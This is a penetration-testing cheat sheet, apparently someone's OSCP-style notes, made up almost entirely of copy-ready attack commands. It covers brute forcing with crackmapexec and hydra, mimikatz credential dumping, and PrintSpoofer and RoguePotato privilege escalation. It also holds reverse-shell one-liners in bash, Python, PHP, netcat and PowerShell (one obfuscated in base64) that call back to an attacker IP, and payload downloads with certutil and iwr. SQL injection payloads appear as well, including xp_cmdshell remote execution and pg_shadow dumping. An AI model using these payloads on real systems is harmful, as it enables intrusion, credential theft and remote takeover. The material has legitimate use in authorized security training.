# Default Credentials
```bash
test every username with password 'password'

admin:admin
admin:password
admin:null
root:root
root:password
root:null
platform:platform
foundusername:foundusername
```

# With Correct Credentials
- crackmpaexec smb all_ips --users
    - with newly found users, try found passwords on crackmapexec smb with just one machine
- crackmapexec winrm all_ips
- xfreerdp with all_ips

# PDF files
- exiftool to find username and use same usernames for password
- read contents on windows

# Linux
## Enumeration
```bash
- sudo -l
- Search for locally running service to pivot as service account?
- Running Process for hidden credentials?

```


## Find all directories which can be written to by current user:
```bash
$ find / -executable -writable -type d 2> /dev/null
```

## kill process on a port
```bash
fuser -k 8080/tcp
```


# Windows

## Enumeration
```bash
# If there's smb, must check for anonymous login
crackmapexec smb 192.168.x.x -u 'random' -p '' --shares

# Users and groups
> whoami /priv
> whoami /groups
> net user | Get-LocalGroup
> net user /domain
> net user admin
> net localgroup | Get-LocalGroup
> net localgroup Administrators | Get-LocalGroupMember Administrators

# AD Users and groups
> net user /domain
> net user jeffadmin /domain
> net group /domain
> net group "Sales Department" /domain


> systeminfo(OS NAME, OS VERSION)
> ipconfig
> netstat -ano

# Installed Applications
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Scheduled tasks: Check Process || query schtasks
> Get-Process
# Or Find Process with Watch-Command.ps1 https://github.com/markwragg/PowerShell-Watch/blob/master/README.md
> . .\Watch-Command.ps1
> Watch-Command -ScriptBlock { Get-Process }

# Scheduled tasks
> schtasks /query /fo LIST /v


# Putty
> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s


# Search for Modifiable services/executables with PowerUP.ps1
> . .\PowerUp.ps1
> Get-ModifiableServiceFile


# Modifiable services/executables
> Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
# Check StartMode
> Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.State -like 'Running'}
> sc qc servicename

> shutdown /r /t 0
> net stop service && net start service
> Restart-Service service


# Search for juicy files
> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
> type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
> Get-History
> (Get-PSReadlineOption).HistorySavePath
> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig -File -Recurse -ErrorAction SilentlyContinue
> Check every user's directory && desktop && documents
```

## Add user
```bash
> net user nuri password123! /add
> net localgroup administrators nuri /add

```

## crackmapexec
```bash
# local auth
--local-auth

#smb
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --pass-pol
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "username" -p "password" --shares
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "username" -p "password" --continue-on-success

#ssh
crackmapexec ssh <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success

#ftp
crackmapexec ftp <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success

#mssql
crackmapexec mssql <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>"
crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM

#winrm
crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'certutil -urlcache -f http://192.168.45.176:8000/revshell7777.exe C:\Users\Public\revshell7777.exe'
proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'C:\Users\Public\revshell7777.exe'

```

## psexec
```bash
psexec.py -hashes '2f2b8d5d4d756a2c72c554580f970c14:2f2b8d5d4d756a2c72c554580f970c14' Administrator@192.168.190.247



When psexec not working
  - crackmapexec smb -x whoami
  - xfreerdp
  - winrm
  - See if we can upload files through shares using smbclient
 

```


## mimikatz
```bash
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
```


## Code Snippet to check where our code is executed
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

## PrintSpoofer
```bash
iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
```

## RoguePotato
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET.MACHINE.IP>:9999
## sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=53 -f exe > reverse.exe
nc -nvlp 53

iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe

.\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
```

## GodPotato
```bash
Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd ".\revshell7777.exe"
.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
```

# HTTP/HTTPS(80,8080,8000,443...)
## HTTP Checklist
- Run feroxbuster?
- Check every directory and file?
- Local File Inclusion (ex. http://192.168.249.12/index.php?page=somepage.php)
  - Can you upload reverse shell through other user?
  - Can you find SSH keys?
- File Traversal (ex. id_rsa?)
- Find CMS and its version?
- SQLi?


## hydra
```bash
# POST 
hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# GET
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.211.201 http-get /
```

## Checklist
- wappalyzer
- sitemap.xml
- robots.txt
- check favicon
-  

## gobuster
```bash
gobuster dir -u http://192.168.216.122/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp,pdf
```

## feroxbuster (must add -x 
```bash
└─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.216.10/ -x php,aspx,jsp,pdf -C 404,401,403 -k
```


## nikto: find webdav, other vuln
```bash
nikto -h http://192.168.222.122
```


## cadaver(username,password required)
```bash
# first create a reverse shell(asp, aspx)
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f aspx > shell.aspx

# connect to cadaver
cadaver http://10.3.20.218/webdav
put /root/offsec/shell.aspx
```

## exiftool
```bash
exiftool -a -u brochure.pdf
```

## wpscan: wordpress
```bash

```


## phpmyadmin: default password
- use default password(password can be null)
- upload php uploader: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
- upload simple-backdoor.php through SQL



# PORT 445: SMb
## crackmapexec smb
```bash
crackmapexec smb 192.168.216.165 -u 'enox' -p '' --shares
crackmapexec smb <% ["RHOST"] %> -u "" -p "" --pass-pol

```

## smbclient
```bash
smbclient \\\\192.168.161.31\\share -U 'Administrator' -N
smbclient \\\\192.168.50.212\\share -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

## smbserver
```bash
sudo smbserver.py -smb2support share $(pwd) 
sudo smbserver.py -smb2support share $(pwd) -user kali -password kali

```


# PORT 389,3268: LDAP
## ldapsearch: focus on samaccount and description
```bash
# unauthenticated
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'

# authenticated(LAPS found from SYSVOL)
ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```


# SNMP(161)
```bash
snmpwalk -c public -v1 192.168.x.x
snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```


## socat
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
```


## NMAP
```bash
sudo nmap -A -p- -T4 192.168.245.145
sudo nmap -sU --open --top-ports 20 -sV 192.168.245.149

```

## Reverse shell
```bash
# bash
bash -i >& /dev/tcp/192.168.45.176/80 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.45.176/80 0>&1'
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F80%200%3E%261%22
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64

# python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


#netcat reverse shell
nc -e /bin/sh 192.168.45.176 80

#PHP reverse shell
php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'


# Powershell: w powercat
IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell

# when executing with base64 encoded
powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA=

# Powershell: wo powercat
$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


#Powershell: Create powershell reverse shell on kali linux
$ kali@kali:~$ pwsh

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText

$powershell -enc $EncodedText

```

## curl
```bash
# GET Request
curl -i http://192.168.50.16:5002/users/v1/admin/password

# POST Request
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

# PUT Request
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

## File Download(When not working, make sure to use 80 and also try it without http://)
```bash
#certutil
certutil -urlcache -split -f http://192.168.45.176:8000/winPEAS.exe c:/users/public/winPEAS.exe

#wget
wget http://192.168.45.176:8000/rev.sh
wget -P /tmp/rev.sh http://192.168.45.176:8000/rev.sh


#powershell
iwr -uri http://192.168.45.176:8000/winPEAS.exe -outfile c:/users/public/winPEAS.exe

#curl
curl http://192.168.45.176/<FILE> > <OUTPUT_FILE>

```

# SSH
## SSH KEYGEN
```bash
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```

## SSH Crack Paraphrase
```bash
$ ssh2john anita_id_rsa > ssh_key
$ hashcat -m 22911 ./ssh_key /usr/share/wordlists/rockyou.txt --force
```


## SSH 
```bash
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
kali@kali: hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force
```


# File Read Exploit
- If the server is running with NY SYSTEM or sudo(root), we can grab any files
- Check SSH Keys [id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, id_dsa]
  - /home/username/{id_rsa}
  - /home/username/.ssh/{id_rsa}  
- find password files for other program that's running(for authenticated exploit that we can actually get reverse shell)
- /etc/passwd
- /etc/shadow
- /home/username/.bash_history
- /home/username/.bash_aliases

# SQLi
## mssql
```bash
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--
';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
```

## postgresql
```bash
' order by 7 -- //
' union select 1, 1, 1, 1, 1, 1 -- //
' union select 'd', 1, 1, 'd', 'd', null -- //

# Current user
' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //

# Use cast to cause error to get the database
' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
## ERROR
<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;DATABASE: glovedb&quot; in <b>/var/www/html/class.php</b> on line <b>423</b><br />

# Use case to find out tables
cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)


# Use cast to find out columns for each table
cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)


# Use cast to find out row for each column
cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)


# Get current user's password!
' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
```

## **CVE-2019–9193**
```bash

1) [Optional] Drop the table you want to use if it already exists

*DROP TABLE IF EXISTS cmd_exec;*

2) Create the table you want to hold the command output

*CREATE TABLE cmd_exec(cmd_output text);*

3) Run the system command via the COPY FROM PROGRAM function

*COPY cmd_exec FROM PROGRAM ‘id’;*

```bash
ex) COPY cmd_exec FROM PROGRAM 'nc 192.168.45.176 4444 -e /bin/bash'
```

4) [Optional] View the results

*SELECT * FROM cmd_exec;*

5) [Optional] Clean up after yourself

*DROP TABLE IF EXISTS cmd_exec;*
```


## Library
```bash
# First run wsgi
/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav

## malicious library file
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.176</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

## create a shortcut
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"

```

## kdbx and KPCLI
```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 

sudo apt install kpcli
kpcli --kdb=Database.kdbx
show -f 2
```

## JohnTheRipper
```bash
# Display already discovered hash
john hashname --show

```

## cross compiliation
```bash
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
